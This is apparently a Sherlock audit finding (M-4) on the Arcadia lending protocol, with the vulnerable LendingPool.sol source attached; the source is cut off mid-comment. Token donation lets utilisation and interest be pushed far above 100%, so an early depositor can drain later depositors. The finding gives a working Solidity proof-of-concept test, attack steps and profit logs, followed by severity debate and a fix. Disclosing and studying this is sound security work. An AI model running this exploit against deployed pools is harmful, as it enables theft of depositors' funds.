{
  "Title": "M-4: Utilisation Can Be Manipulated Far Above 100%",
  "Content": "# Issue M-4: Utilisation Can Be Manipulated Far Above 100% \n\nSource: https://github.com/sherlock-audit/2023-12-arcadia-judging/issues/93 \n\n## Found by \nBandit, zzykxx\n## Summary\n\nThe utilisation of the protocol can be manipulated far above 100% via token donation. It is easiest to set this up on an empty pool. This can be used to manipulate the interest to above 10000% per minute to steal from future depositors.\n\n## Vulnerability Detail\n\nThis attack is inspired by / taken from this bug report for Silo Finance. I recommend reading it as is very well written: https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a\n\nThe utilisation is basically _assets_borrowed / assets_loaned_. A higher utilisation creates a higher interest rate. This is assumed to be less than 100%. However if it exceeds 100%, there is no cap here:\n\nhttps://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol#L809-L817\n\nNormally, assets borrowed should never exceed assets loaned, however this is possible in Arcadia as the only thing stopping a borrow exceeding loans is that the `transfer` of tokens will revert due to not enough tokens in the `Lending pool`. However, an attacker can make it not revert by simply sending tokens directly into the lending pool. For example using the following sequence:\n\n1. deposit 100 assets into tranche\n2. Use ERC20 Transfer to transfer `1e18` assets into the `LendingPool`\n3. Borrow the `1e18` assets\n\nThese are the first steps of the coded POC at the bottom of this issue. It uses a token donation to make a borrow which is far larger than the loan amount. \n\nIn the utilisation calculation, this results in a incredibly high utilisation rate  and thus interest rate as it is not capped at 100%. This is why some protocols implement a hardcap of utilisation at 100%.\n\nThe interest rate is so high that over 2 minutes, 100 assets grows to over100000 assets, or a 100000% interest over 2 minutes. The linked similar exploit on Silo Finance has an even more drastic interest manipulation which could drain the whole protocol in a block. However I did not optimise the numbers for this POC.\n\nNote that the 1e18 assets \"donated\" to the protocol are not lost. They can simply be all borrowed into an attackers account.\n\nThe attacker can set this up when the initial lending pool is empty. Then, they can steal assets from subsequent depositors due to the huge amount of interest collected from their small initial deposit\n\nLet me sum up the attack in the POC:\n\n1. deposit 100 assets into tranche\n2. Use ERC20 Transfer to transfer `1e18` assets into the `LendingPool`\n3. Borrow the `1e18` assets\n4. Victim deposits into tranche\n5. Attacker withdraws the victims funds which is greater than the 100 assets the attacker initially deposited\n\nHere is the output from the console.logs:\n\n```bash\nRunning 1 test for test/scenario/BorrowAndRepay.scenario.t.sol:BorrowAndRepay_Scenario_Test\n[PASS] testScenario_Poc() (gas: 799155)\nLogs:\n  100 initial pool balance. This is also the amount deposited into tranche\n  warp 2 minutes into future\n  mint was used rather than deposit to ensure no rounding error. This a UTILISATION manipulation attack not a share inflation attack\n  22 shares were burned in exchange for 100000 assets. Users.LiquidityProvider only deposited 100 asset in the tranche but withdrew 100000 assets!\n\n```\n\nThis is the edited version of `setUp()` in `_scenario.t.sol`\n\n```solidity\nfunction setUp() public virtual override(Fuzz_Lending_Test) {\n        Fuzz_Lending_Test.setUp();\n        deployArcadiaLendingWithAccounts();\n\n        vm.prank(users.creatorAddress);\n        pool.addTranche(address(tranche), 50);\n\n        // Deposit funds in the pool.\n        deal(address(mockERC20.stable1), users.liquidityProvider, type(uint128).max, true);\n\n        vm.startPrank(users.liquidityProvider);\n        mockERC20.stable1.approve(address(pool), 100);\n        //only 1 asset was minted to the liquidity provider\n        tranche.mint(100, users.liquidityProvider);\n        vm.stopPrank();\n\n        vm.startPrank(users.creatorAddress);\n        pool.setAccountVersion(1, true);\n        pool.setInterestParameters(\n            Constants.interestRate, Constants.interestRate, Constants.interestRate, Constants.utilisationThreshold\n        );\n        vm.stopPrank();\n\n        vm.prank(users.accountOwner);\n        proxyAccount.openMarginAccount(address(pool));\n    }\n```\n\nThis test was added to `BorrowAndRepay.scenario.t.sol`\n\n```solidity\n    function testScenario_Poc() public {\n\n        uint poolBalance = mockERC20.stable1.balanceOf(address(pool));\n        console.log(poolBalance, \"initial pool balance. This is also the amount deposited into tranche\");\n        vm.startPrank(users.liquidityProvider);\n        mockERC20.stable1.approve(address(pool), 1e18);\n        mockERC20.stable1.transfer(address(pool),1e18);\n        vm.stopPrank();\n\n        // Given: collateralValue is smaller than maxExposure.\n        //amount token up to max\n        uint112 amountToken = 1e30;\n        uint128 amountCredit = 1e10;\n\n        //get the collateral factor\n        uint16 collFactor_ = Constants.tokenToStableCollFactor;\n        uint256 valueOfOneToken = (Constants.WAD * rates.token1ToUsd) / 10 ** Constants.tokenOracleDecimals;\n\n        //deposits token1 into proxyAccount\n        depositTokenInAccount(proxyAccount, mockERC20.token1, amountToken);\n\n        uint256 maxCredit = (\n            //amount credit is capped based on amount Token\n            (valueOfOneToken * amountToken) / 10 ** Constants.tokenDecimals * collFactor_ / AssetValuationLib.ONE_4\n                / 10 ** (18 - Constants.stableDecimals)\n        );\n\n\n        vm.startPrank(users.accountOwner);\n        //borrow the amountCredit to the proxy account\n        pool.borrow(amountCredit, address(proxyAccount), users.accountOwner, emptyBytes3);\n        vm.stopPrank();\n\n        assertEq(mockERC20.stable1.balanceOf(users.accountOwner), amountCredit);\n\n        //warp 2 minutes into the future.\n        vm.roll(block.number + 10);\n        vm.warp(block.timestamp + 120);\n\n        console.log(\"warp 2 minutes into future\");\n\n        address victim = address(123);\n        deal(address(mockERC20.stable1), victim, type(uint128).max, true);\n\n        vm.startPrank(victim);\n        mockERC20.stable1.approve(address(pool), type(uint128).max);\n        uint shares = tranche.mint(1e3, victim);\n        vm.stopPrank();\n\n        console.log(\"mint was used rather than deposit to ensure no rounding error. This a UTILISATION manipulation attack not a share inflation attack\");\n\n        //function withdraw(uint256 assets, address receiver, address owner_)\n\n        //WITHDRAWN 1e5\n        vm.startPrank(users.liquidityProvider);\n        uint withdrawShares = tranche.withdraw(1e5, users.liquidityProvider,users.liquidityProvider);\n        vm.stopPrank();\n\n        console.log(withdrawShares, \"shares were burned in exchange for 100000 assets. Users.LiquidityProvider only deposited 100 asset in the tranche but withdrew 100000 assets!\");\n\n\n    }\n```\n\n## Impact\n\nAn early depositor can steal funds from future depositors through utilisation/interest rate manipulation.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol#L809-L817\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd a utilisation cap of 100%. Many other lending protocols implement this mitigation.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid:  utilization should be mitigated; high(6)\n\n\n\n**sherlock-admin**\n\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/lending-v2/pull/137.\n\n**sherlock-admin2**\n\n> This should be high as it can steal both the first subsequent deposit and all future deposits after that. The original linked issue for Silo Finance was Critical although Silo had multiple simultaneous pools. The interest rate formula for both Silo and Arcadia are the same, but that POC was more optimised which shows a faster rate of massive interest accrual.\n\nYou've deleted an escalation for this issue.\n\n**nevillehuang**\n\nHi @Banditx0x I believe the following factors mentioned by @zzykxx in his report warrants the decrease in severity:\n\n> - The interest rate is capped at 2^80 (~= 10^24) because of the downcasting in [LendingPool::_calculateInterestRate()](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol#L837). The maximum interest is about 100% every 20 days.\n> - The tokens sent directly to the pool by the griefer are effectively lost and can be transferred to the treasury.\n> - The virtual shares implementation in the tranches might prevent the attacker from collecting all of the interest.\n\nSponsors Comments:\n\n> impact is only possible in quasi empty pools, and cost for doing it is largely in line with the damage done. In the example of 93, only 100 assets are in the pool, 1e18 are donated by the attacker → only the user borrowing the 100 assets is affected, so in this case of an empty pool, not a lot, and even more, the 1e18 can indeed be borrowed by the attacker, but he’ll be liquidated and incur a loss himself: he is the one paying the interest he jacked up (even if only >100 is recovered through liquidations, the LP actually profits, since the penalty is paid on a larger amount than what the “good” lp borrowed out). → low probability, cost is high → medium at most\n\n**zzykxx**\n\nHey @Banditx0x, correct me if I'm wrong, but I think the following applies here:\n- In the Silo finance exploit depositing assets in a pool allowed to use the shares of the said pool to borrow other assets. An attacker  could deposit a small amount, borrow his own donation (increasing the utilization rate), which had the effect of increasing the value of his initial donation. Then he could use the initial donation, which is now extremely overvalued, as collateral to borrow assets and steal funds. This is not possible here because the shares of a lending pool cannot be used as collateral to borrow assets.\n- Unlike the Silo finance case, the maximum interest rate achievable is capped at `uint80` =~ `10^24`.\n- To steal a sensible amount of funds the attacker should first deposit more than \"100\" assets. But by depositing more than \"100\" assets the required amount to donate to achieve maximum utilization manipulation also increases. You could argue this is not the case and more time just needs to pass, but if anybody in the meantime deposits extra funds in the tranche and/or calls `updateInterestRate()` the interest rate will diminish the speed at which it increases.\n- The attacker, which as you said can borrow his own donation, also has to pay interest on it.\n- In your POC the virtual shares are not taken into account. As we know virtual shares cause a loss to the first depositor, this depends on the amount of decimals and the value of the underlying and also by how much the virtual share is set at.\n\n\nSome damage can be caused by abusing this issue, but I think the damage is not big enough to classify this as high severity. Of course, I would be more than happy to be proven wrong since this would also be in my personal interest.\n\n\n\n**Banditx0x**\n\n@zzykxx thanks for the response. You're right that the Silo finance situation had much higher impact due to manipulation of one asset allowing borrows of another. However I had originally thought that the impact would be High even with this in mind as it had the same impact as the share inflation attack which historically has had high severity. \n\nI hadn't realised the maximum interest rate was capped at `uint80`, which indeed caps the interest rate to far lower than the issue I had linked. \n\n\nGiven the slower interest rate accrual than I originally thought, I agree with the medium severity.\n\nEdit: i deleted past escalation comment due to this discussion. Just so this conversation makes sense for future readers.\n\n**Czar102**\n\nPlanning to reject the escalation and leave the issue as is.\n\n**Czar102**\n\nResult:\nMedium\nHas duplicates\n\n**midori-fuse**\n\nWasn't the escalation deleted before the period end?\n\nBanditx0x's comment was last edited on 5:26AM UTC, while the escalation period end was 12:36PM same day. \n\n**Czar102**\n\n@midori-fuse It looks so, we will look into it. Thank you for bringing this up!\n\n**Czar102**\n\nThe escalation should have been deleted, there was an issue on Sherlock's part that's now resolved.\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/137",
  "Code": [
    {
      "filename": "lending-v2/src/LendingPool.sol",
      "content": "/**\n * Created by Pragma Labs\n * SPDX-License-Identifier: BUSL-1.1\n */\npragma solidity 0.8.22;\n\nimport { Creditor } from \"../lib/accounts-v2/src/abstracts/Creditor.sol\";\nimport { DebtToken, ERC20, ERC4626 } from \"./DebtToken.sol\";\nimport { FixedPointMathLib } from \"../lib/solmate/src/utils/FixedPointMathLib.sol\";\nimport { IAccount } from \"./interfaces/IAccount.sol\";\nimport { IFactory } from \"./interfaces/IFactory.sol\";\nimport { ILendingPool } from \"./interfaces/ILendingPool.sol\";\nimport { ITranche } from \"./interfaces/ITranche.sol\";\nimport { LendingPoolErrors } from \"./libraries/Errors.sol\";\nimport { LendingPoolGuardian } from \"./guardians/LendingPoolGuardian.sol\";\nimport { LogExpMath } from \"./libraries/LogExpMath.sol\";\nimport { SafeCastLib } from \"../lib/solmate/src/utils/SafeCastLib.sol\";\nimport { SafeTransferLib } from \"../lib/solmate/src/utils/SafeTransferLib.sol\";\n\n/**\n * @title Arcadia LendingPool.\n * @author Pragma Labs\n * @notice The Lending pool is responsible for the:\n * - Accounting of the liabilities of borrowers via the debtTokens (ERC4626).\n * - Accounting of the liquidity of the Liquidity Providers, via one or more Tranche(s) (ERC4626).\n * - Management of issuing and repaying debt.\n * - Management of interest payments.\n * - Settlement of liquidations and default events.\n */\ncontract LendingPool is LendingPoolGuardian, Creditor, DebtToken, ILendingPool {\n    using FixedPointMathLib for uint256;\n    using SafeTransferLib for ERC20;\n\n    /* //////////////////////////////////////////////////////////////\n                                CONSTANTS\n    ////////////////////////////////////////////////////////////// */\n\n    // Seconds per year, leap years ignored.\n    uint256 internal constant YEARLY_SECONDS = 31_536_000;\n    // Contract address of the Arcadia Account Factory.\n    address internal immutable ACCOUNT_FACTORY;\n    // Contract address of the Liquidator contract.\n    address internal immutable LIQUIDATOR;\n    // The unit for fixed point numbers with 4 decimals precision.\n    uint256 internal constant ONE_4 = 10_000;\n    // Maximum total liquidation penalty, 4 decimal precision.\n    uint256 internal constant MAX_TOTAL_PENALTY = 1100;\n\n    /* //////////////////////////////////////////////////////////////\n                                STORAGE\n    ////////////////////////////////////////////////////////////// */\n\n    // The current interest rate, 18 decimals precision.\n    uint80 public interestRate;\n    // The interest rate when utilisation is 0.\n    // 18 decimals precision.\n    uint72 internal baseRatePerYear;\n    // The slope of the first curve, defined as the delta in interest rate for a delta in utilisation of 100%.\n    // 18 decimals precision.\n    uint72 internal lowSlopePerYear;\n    // The slope of the second curve, defined as the delta in interest rate for a delta in utilisation of 100%.\n    // 18 decimals precision.\n    uint72 internal highSlopePerYear;\n    // The optimal capital utilisation, where we go from the first curve to the steeper second curve.\n    // 4 decimal precision.\n    uint16 internal utilisationThreshold;\n    // Last timestamp that interests were realized.\n    uint32 internal lastSyncedTimestamp;\n    // Fee issued upon taking debt, 4 decimals precision (10 equals 0.001 or 0.1%), capped at 255 (2.55%).\n    uint8 public originationFee;\n    // Sum of all the interest weights of the tranches + treasury.\n    uint24 internal totalInterestWeight;\n    // Fraction (interestWeightTreasury / totalInterestWeight) of the interest fees that go to the treasury.\n    uint16 internal interestWeightTreasury;\n    // Fraction (liquidationWeightTreasury / totalLiquidationWeight) of the liquidation fees that goes to the treasury.\n    uint16 internal liquidationWeightTreasury;\n    // Fraction (liquidationWeightTranche / totalLiquidationWeight) of the liquidation fees that goes to the most Junior Tranche.\n    uint16 internal liquidationWeightTranche;\n\n    // Total amount of `underlying asset` that is claimable by the LPs. Does not take into account pending interests.\n    uint128 internal totalRealisedLiquidity;\n    // The minimum amount of collateral that must be held in an Account before a position can be opened.\n    uint96 internal minimumMargin;\n\n    // Address of the protocol treasury.\n    address internal treasury;\n    // Number of auctions that are currently in progress.\n    uint16 internal auctionsInProgress;\n    // Maximum amount of `underlying asset` that is paid as fee to the initiator/terminator of a liquidation.\n    uint80 internal maxReward;\n    // Minimum initiation and termination reward, relative to the minimumMargin, 4 decimal precision.\n    uint16 internal minRewardWeight;\n    // Fee paid to the Liquidation Initiator.\n    // Defined as a fraction of the openDebt with 4 decimals precision.\n    // Absolute fee can be further capped to a max amount by the creditor.\n    uint16 internal initiationWeight;\n    // Penalty the Account owner has to pay to the Creditor on top of the open Debt for being liquidated.\n    // Defined as a fraction of the openDebt with 4 decimals precision.\n    uint16 internal penaltyWeight;\n    // Fee paid to the address that is ending an auction.\n    // Defined as a fraction of the openDebt with 4 decimals precision.\n    uint16 internal terminationWeight;\n\n    // Array of the interest weights of each Tranche.\n    // Fraction (interestWeightTranches[i] / totalInterestWeight) of the interest fees that go to Tranche i.\n    uint16[] internal interestWeightTranches;\n    // Array of the contract addresses of the Tranches.\n    address[] internal tranches;\n\n    // Map tranche => status.\n    mapping(address => bool) internal isTranche;\n    // Map tranche => interestWeight.\n    // Fraction (interestWeightTranches[i] / totalInterestWeight) of the interest fees that go to Tranche i.\n    mapping(address => uint256) internal interestWeight;\n    // Map tranche => realisedLiquidity.\n    // Amount of `underlying asset` that is claimable by the liquidity providers.\n    // Does not take into account pending interests.\n    mapping(address => uint256) internal realisedLiquidityOf;\n    // Map Account => owner => beneficiary => amount.\n    // Stores the credit allowances for a beneficiary per Account and per Owner.\n    mapping(address => mapping(address => mapping(address => uint256))) public creditAllowance;\n\n    /* //////////////////////////////////////////////////////////////\n                                EVENTS\n    ////////////////////////////////////////////////////////////// */\n\n    event AuctionStarted(address indexed account, address indexed creditor, uint128 openDebt);\n    event AuctionFinished(\n        address indexed account,\n        address indexed creditor,\n        uint256 startDebt,\n        uint256 initiationReward,\n        uint256 terminationReward,\n        uint256 penalty,\n        uint256 badDebt,\n        uint256 surplus\n    );\n    event Borrow(\n        address indexed account, address indexed by, address to, uint256 amount, uint256 fee, bytes3 indexed referrer\n    );\n    event CreditApproval(address indexed account, address indexed owner, address indexed beneficiary, uint256 amount);\n    event InterestSynced(uint256 interest);\n    event InterestWeightTrancheUpdated(address indexed tranche, uint8 indexed trancheIndex, uint16 interestWeight);\n    event LiquidationWeightTrancheUpdated(uint16 liquidationWeight);\n    event PoolStateUpdated(uint256 totalDebt, uint256 totalLiquidity, uint80 interestRate);\n    event Repay(address indexed account, address indexed from, uint256 amount);\n    event TranchePopped(address tranche);\n    event TreasuryWeightsUpdated(uint16 interestWeight, uint16 liquidationWeight);\n\n    /* //////////////////////////////////////////////////////////////\n                                MODIFIERS\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Checks if caller is the Liquidator.\n     */\n    modifier onlyLiquidator() {\n        if (LIQUIDATOR != msg.sender) revert LendingPoolErrors.Unauthorized();\n        _;\n    }\n\n    /**\n     * @notice Checks if caller is a Tranche.\n     */\n    modifier onlyTranche() {\n        if (!isTranche[msg.sender]) revert LendingPoolErrors.Unauthorized();\n        _;\n    }\n\n    /**\n     * @notice Syncs interest to LPs and treasury and updates the interest rate.\n     */\n    modifier processInterests() {\n        _syncInterests();\n        _;\n        // _updateInterestRate() modifies the state (effect), but can safely be called after interactions.\n        // Cannot be exploited by re-entrancy attack.\n        _updateInterestRate(realisedDebt, totalRealisedLiquidity);\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                                CONSTRUCTOR\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice The constructor for a lending pool.\n     * @param riskManager_ The address of the new Risk Manager.\n     * @param asset_ The underlying ERC20 token of the Lending Pool.\n     * @param treasury_ The address of the protocol treasury.\n     * @param accountFactory The contract address of the Arcadia Account Factory.\n     * @param liquidator The contract address of the Liquidator.\n     * @dev The name and symbol of the DebtToken are automatically generated, based on the name and symbol of the underlying token.\n     */\n    constructor(address riskManager_, ERC20 asset_, address treasury_, address accountFactory, address liquidator)\n        LendingPoolGuardian()\n        Creditor(riskManager_)\n        DebtToken(asset_)\n    {\n        treasury = treasury_;\n        ACCOUNT_FACTORY = accountFactory;\n        LIQUIDATOR = liquidator;\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                            TRANCHES LOGIC\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Adds a tranche to the Lending Pool.\n     * @param tranche The address of the Tranche.\n     * @param interestWeight_ The interest weight of the specific Tranche.\n     * @dev The order of the tranches is important, the most senior tranche is added first at index 0, the most junior at the last index.\n     * @dev Each Tranche is an ERC4626 contract.\n     * @dev The interest weight of each Tranche determines the relative share of the yield (interest payments) that goes to its Liquidity providers.\n     */\n    function addTranche(address tranche, uint16 interestWeight_) external onlyOwner processInterests {\n        if (auctionsInProgress > 0) revert LendingPoolErrors.AuctionOngoing();\n        if (isTranche[tranche]) revert LendingPoolErrors.TrancheAlreadyExists();\n\n        totalInterestWeight += interestWeight_;\n        interestWeightTranches.push(interestWeight_);\n        interestWeight[tranche] = interestWeight_;\n\n        uint8 trancheIndex = uint8(tranches.length);\n        tranches.push(tranche);\n        isTranche[tranche] = true;\n\n        emit InterestWeightTrancheUpdated(tranche, trancheIndex, interestWeight_);\n    }\n\n    /**\n     * @notice Changes the interest weight of a specific Tranche.\n     * @param index The index of the Tranche for which a new interest weight is being set.\n     * @param interestWeight_ The new interest weight of the Tranche at the index.\n     * @dev The interest weight of each Tranche determines the relative share of yield (interest payments) that goes to its Liquidity providers.\n     */\n    function setInterestWeightTranche(uint256 index, uint16 interestWeight_) external onlyOwner processInterests {\n        if (index >= tranches.length) revert LendingPoolErrors.NonExistingTranche();\n        totalInterestWeight = totalInterestWeight - interestWeightTranches[index] + interestWeight_;\n        interestWeightTranches[index] = interestWeight_;\n        address tranche = tranches[index];\n        interestWeight[tranche] = interestWeight_;\n\n        emit InterestWeightTrancheUpdated(tranche, uint8(index), interestWeight_);\n    }\n\n    /**\n     * @notice Changes the liquidation weight of the most Junior Tranche.\n     * @param liquidationWeight The new liquidation weight of the Tranche at the highest index.\n     * @dev The liquidation weight determines the relative share of liquidation fees that goes to the most Junior Tranche.\n     */\n    function setLiquidationWeightTranche(uint16 liquidationWeight) external onlyOwner {\n        emit LiquidationWeightTrancheUpdated(liquidationWeightTranche = liquidationWeight);\n    }\n\n    /**\n     * @notice Removes the Tranche at the last index (most junior).\n     * @param index The index of the last Tranche.\n     * @param tranche The address of the last Tranche.\n     * @dev This function can only be called by the function _processDefault(uint256 assets),\n     * when there is a default as big as (or bigger than) the complete amount of liquidity of the most junior Tranche.\n     * @dev Passing the input parameters to the function saves gas compared to reading the address and index of the last Tranche from storage.\n     * No need to check if index and Tranche are indeed of the last tranche since function is only called by _processDefault.\n     */\n    function _popTranche(uint256 index, address tranche) internal {\n        unchecked {\n            totalInterestWeight -= interestWeightTranches[index];\n        }\n        isTranche[tranche] = false;\n        interestWeightTranches.pop();\n        tranches.pop();\n        interestWeight[tranche] = 0;\n\n        emit TranchePopped(tranche);\n    }\n\n    /* ///////////////////////////////////////////////////////////////\n                    TREASURY FEE CONFIGURATION\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Changes the interest and liquidation weight of the Treasury.\n     * @param interestWeight_ The new interestWeight of the treasury.\n     * @param liquidationWeight The new liquidationWeight of the treasury.\n     * @dev The interestWeight determines the relative share of the yield (interest payments) that goes to the protocol treasury.\n     * @dev Setting interestWeightTreasury to a very high value will cause the treasury to collect all interest fees from that moment on.\n     * Although this will affect the future profits of liquidity providers, no funds nor realized interest are at risk for LPs.\n     */\n    function setTreasuryWeights(uint16 interestWeight_, uint16 liquidationWeight) external onlyOwner processInterests {\n        totalInterestWeight = totalInterestWeight - interestWeightTreasury + interestWeight_;\n\n        emit TreasuryWeightsUpdated(\n            interestWeightTreasury = interestWeight_, liquidationWeightTreasury = liquidationWeight\n        );\n    }\n\n    /**\n     * @notice Sets new treasury address.\n     * @param treasury_ The new address of the treasury.\n     */\n    function setTreasury(address treasury_) external onlyOwner {\n        treasury = treasury_;\n    }\n\n    /**\n     * @notice Sets the new origination fee.\n     * @param originationFee_ The new origination fee.\n     * @dev originationFee is limited by being a uint8 -> max value is 2.55%\n     * 4 decimal precision (10 = 0.1%).\n     */\n    function setOriginationFee(uint8 originationFee_) external onlyOwner {\n        originationFee = originationFee_;\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                        DEPOSIT/WITHDRAWAL LOGIC\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Deposit assets in the Lending Pool.\n     * @param assets The amount of assets of the underlying ERC20 tokens being deposited.\n     * @param from The address of the Liquidity Provider who deposits the underlying ERC20 token via a Tranche.\n     * @dev This function can only be called by Tranches.\n     */\n    function depositInLendingPool(uint256 assets, address from)\n        external\n        whenDepositNotPaused\n        onlyTranche\n        processInterests\n    {\n        // Need to transfer before minting or ERC777s could reenter.\n        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.\n        asset.safeTransferFrom(from, address(this), assets);\n\n        unchecked {\n            realisedLiquidityOf[msg.sender] += assets;\n            totalRealisedLiquidity = SafeCastLib.safeCastTo128(assets + totalRealisedLiquidity);\n        }\n    }\n\n    /**\n     * @notice Donate assets to the Lending Pool.\n     * @param trancheIndex The index of the tranche to donate to.\n     * @param assets The amount of assets of the underlying ERC20 tokens being deposited.\n     * @dev Can be used by anyone to donate assets to the Lending Pool.\n     * It is supposed to serve as a way to compensate the jrTranche after an\n     * auction didn't get sold and was manually liquidated after cutoffTime.\n     * @dev Inflation attacks by the first depositor in the Tranches have to be prevented with virtual assets/shares.\n     */\n    function donateToTranche(uint256 trancheIndex, uint256 assets) external whenDepositNotPaused processInterests {\n        if (assets == 0) revert LendingPoolErrors.ZeroAmount();\n\n        address tranche = tranches[trancheIndex];\n\n        // Need to transfer before donating or ERC777s could reenter.\n        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.\n        asset.safeTransferFrom(msg.sender, address(this), assets);\n\n        unchecked {\n            realisedLiquidityOf[tranche] += assets; //[̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅]\n            totalRealisedLiquidity = SafeCastLib.safeCastTo128(assets + totalRealisedLiquidity);\n        }\n    }\n\n    /**\n     * @notice Withdraw assets from the Lending Pool.\n     * @param assets The amount of assets of the underlying ERC20 tokens being withdrawn.\n     * @param receiver The address of the receiver of the underlying ERC20 tokens.\n     * @dev This function can be called by anyone with an open balance (realisedLiquidityOf[address] bigger than 0),\n     * which can be both Tranches as other address (treasury, Liquidation Initiators, Liquidated Account Owner...).\n     */\n    function withdrawFromLendingPool(uint256 assets, address receiver)\n        external\n        whenWithdrawNotPaused\n        processInterests\n    {\n        if (realisedLiquidityOf[msg.sender] < assets) revert LendingPoolErrors.AmountExceedsBalance();\n\n        unchecked {\n            realisedLiquidityOf[msg.sender] -= assets;\n            totalRealisedLiquidity = SafeCastLib.safeCastTo128(totalRealisedLiquidity - assets);\n        }\n\n        asset.safeTransfer(receiver, assets);\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                            LENDING LOGIC\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Approve a beneficiary to take out debt against an Arcadia Account.\n     * @param beneficiary The address of the beneficiary who can take out debt backed by an Arcadia Account.\n     * @param amount The amount of underlying ERC20 tokens to be lent out.\n     * @param account The address of the Arcadia Account backing the debt.\n     */\n    function approveBeneficiary(address beneficiary, uint256 amount, address account) external {\n        // If Account is not an actual address of an Arcadia Account, ownerOfAccount(address) will return the zero address.\n        if (IFactory(ACCOUNT_FACTORY).ownerOfAccount(account) != msg.sender) revert LendingPoolErrors.Unauthorized();\n\n        creditAllowance[account][msg.sender][beneficiary] = amount;\n\n        emit CreditApproval(account, msg.sender, beneficiary, amount);\n    }\n\n    /**\n     * @notice Takes out debt backed by collateral in an Arcadia Account.\n     * @param amount The amount of underlying ERC20 tokens to be lent out.\n     * @param account The address of the Arcadia Account backing the debt.\n     * @param to The address who receives the lent out underlying tokens.\n     * @param referrer A unique identifier of the referrer, who will receive part of the fees generated by this transaction.\n     * @dev The sender might be different than the owner if they have the proper allowances.\n     */\n    function borrow(uint256 amount, address account, address to, bytes3 referrer)\n        external\n        whenBorrowNotPaused\n        processInterests\n    {\n        // If Account is not an actual address of an Account, ownerOfAccount(address) will return the zero address.\n        address accountOwner = IFactory(ACCOUNT_FACTORY).ownerOfAccount(account);\n        if (accountOwner == address(0)) revert LendingPoolErrors.IsNotAnAccount();\n\n        uint256 amountWithFee = amount + amount.mulDivUp(originationFee, ONE_4);\n\n        // Check allowances to take debt.\n        if (accountOwner != msg.sender) {\n            uint256 allowed = creditAllowance[account][accountOwner][msg.sender];\n            if (allowed != type(uint256).max) {\n                creditAllowance[account][accountOwner][msg.sender] = allowed - amountWithFee;\n            }\n        }\n\n        // Mint debt tokens to the Account.\n        _deposit(amountWithFee, account);\n\n        // Add origination fee to the treasury.\n        unchecked {\n            if (amountWithFee - amount > 0) {\n                totalRealisedLiquidity = SafeCastLib.safeCastTo128(amountWithFee + totalRealisedLiquidity - amount);\n                realisedLiquidityOf[treasury] += amountWithFee - amount;\n            }\n        }\n\n        // UpdateOpenPosition checks that the Account indeed has opened a margin account for this Lending Pool and\n        // checks that it is still healthy after the debt is increased with amountWithFee.\n        // Reverts in Account if one of the checks fails.\n        uint256 accountVersion = IAccount(account).increaseOpenPosition(maxWithdraw(account));\n        if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();\n\n        // Transfer fails if there is insufficient liquidity in the pool.\n        asset.safeTransfer(to, amount);\n\n        emit Borrow(account, msg.sender, to, amount, amountWithFee - amount, referrer);\n    }\n\n    /**\n     * @notice Repays debt.\n     * @param amount The amount of underlying ERC20 tokens to be repaid.\n     * @param account The contract address of the Arcadia Account backing the debt.\n     * @dev if Account is not an actual address of an Arcadia Account, maxWithdraw(account) will always return 0.\n     * Function will not revert, but amount is always 0.\n     * @dev Anyone (EOAs and contracts) can repay debt in the name of an Account.\n     */\n    function repay(uint256 amount, address account) external whenRepayNotPaused processInterests {\n        uint256 accountDebt = maxWithdraw(account);\n        amount = accountDebt > amount ? amount : accountDebt;\n\n        // Need to transfer before burning debt or ERC777s could reenter.\n        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.\n        asset.safeTransferFrom(msg.sender, address(this), amount);\n\n        _withdraw(amount, address(this), account);\n\n        emit Repay(account, msg.sender, amount);\n    }\n\n    /**\n     * @notice Repays debt via an auction.\n     * @param startDebt The amount of debt of the Account the moment the liquidation was initiated.\n     * @param minimumMargin_ The minimum margin of the Account.\n     * @param amount The amount repaid by a bidder during the auction.\n     * @param account The contract address of the Arcadia Account backing the debt.\n     * @param bidder The address of the bidder.\n     * @return earlyTerminate Bool indicating whether the full amount of debt was repaid.\n     * @dev This function allows a liquidator to repay a specified amount of debt for a user.\n     */\n    function auctionRepay(uint256 startDebt, uint256 minimumMargin_, uint256 amount, address account, address bidder)\n        external\n        whenLiquidationNotPaused\n        onlyLiquidator\n        processInterests\n        returns (bool earlyTerminate)\n    {\n        // Need to transfer before burning debt or ERC777s could reenter.\n        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.\n        asset.safeTransferFrom(bidder, address(this), amount);\n\n        uint256 accountDebt = maxWithdraw(account);\n        if (accountDebt == 0) revert LendingPoolErrors.IsNotAnAccountWithDebt();\n        if (accountDebt <= amount) {\n            // The amount recovered by selling assets during the auction is bigger than the total debt of the Account.\n            // -> Terminate the auction and make the surplus available to the Account-Owner.\n            earlyTerminate = true;\n            unchecked {\n                _settleLiquidationHappyFlow(account, startDebt, minimumMargin_, bidder, (amount - accountDebt));\n            }\n            amount = accountDebt;\n        }\n\n        _withdraw(amount, address(this), account);\n\n        emit Repay(account, bidder, amount);\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                        LEVERAGED ACTIONS LOGIC\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Execute and interact with external logic 